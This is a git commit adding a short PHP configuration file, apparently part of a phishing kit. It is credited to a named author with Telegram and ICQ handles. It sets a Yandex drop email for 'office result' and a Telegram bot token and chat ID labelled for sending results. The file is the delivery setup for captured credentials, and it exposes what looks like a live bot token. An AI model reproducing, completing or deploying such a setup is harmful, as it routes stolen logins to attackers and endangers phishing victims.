9307de3e061135be46240f03ff10769b963141a0
verifier9 <152935632+verifier9@users.noreply.github.com>
2023-12-05 03:41:23 +0200

    Add files via upload

---
+++ Yourmail.php
@@ -0,0 +1,15 @@
+<?php
+/*
+  //||~~ By ~~ saradauchia ~~\\         			       	                
+ // Telegram Id: @saradauchia \\
+// ICQ Id: @saradauchia2 \\	
+*/
+
+$send ="officeresult01@yandex.com"; 
+
+//telgram rzlt
+$api = "6050414873:AAFBhBrsO0ckMbrjaBai-uarI41qRMldOkY";
+$chatid = "6056612948";
+
+
+?>
